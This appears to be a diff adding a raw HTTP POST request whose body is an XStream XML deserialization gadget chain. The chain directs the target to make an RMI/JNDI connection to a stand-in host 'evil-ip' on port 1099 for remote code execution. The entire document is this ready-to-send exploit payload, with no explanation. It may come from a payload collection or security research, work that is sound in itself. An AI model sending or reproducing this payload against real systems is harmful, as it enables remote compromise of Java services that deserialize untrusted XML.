@@ -1,0 +1,67 @@
+POST / HTTP/1.1
+Host: 10.10.3.128
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+Content-Length: 3103
+
+<java.util.PriorityQueue serialization='custom'>
+    <unserializable-parents/>
+    <java.util.PriorityQueue>
+        <default>
+            <size>2</size>
+        </default>
+        <int>3</int>
+        <javax.naming.ldap.Rdn_-RdnEntry>
+            <type>12345</type>
+            <value class='com.sun.org.apache.xpath.internal.objects.XString'>
+                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>
+            </value>
+        </javax.naming.ldap.Rdn_-RdnEntry>
+        <javax.naming.ldap.Rdn_-RdnEntry>
+            <type>12345</type>
+            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>
+                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>
+                    <parsedMessage>true</parsedMessage>
+                    <soapVersion>SOAP_11</soapVersion>
+                    <bodyParts/>
+                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>
+                        <attachmentsInitialized>false</attachmentsInitialized>
+                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>
+                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>
+                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>
+                                    <names>
+                                        <string>aa</string>
+                                        <string>aa</string>
+                                    </names>
+                                    <ctx>
+                                        <environment/>
+                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>
+                                            <java.rmi.server.RemoteObject>
+                                                <string>UnicastRef</string>
+                                                <string>evil-ip</string>
+                                                <int>1099</int>
+                                                <long>0</long>
+                                                <int>0</int>
+                                                <long>0</long>
+                                                <short>0</short>
+                                                <boolean>false</boolean>
+                                            </java.rmi.server.RemoteObject>
+                                        </registry>
+                                        <host>evil-ip</host>
+                                        <port>1099</port>
+                                    </ctx>
+                                </candidates>
+                            </aliases>
+                        </nullIter>
+                    </sm>
+                </message>
+            </value>
+        </javax.naming.ldap.Rdn_-RdnEntry>
+    </java.util.PriorityQueue>
+</java.util.PriorityQueue>
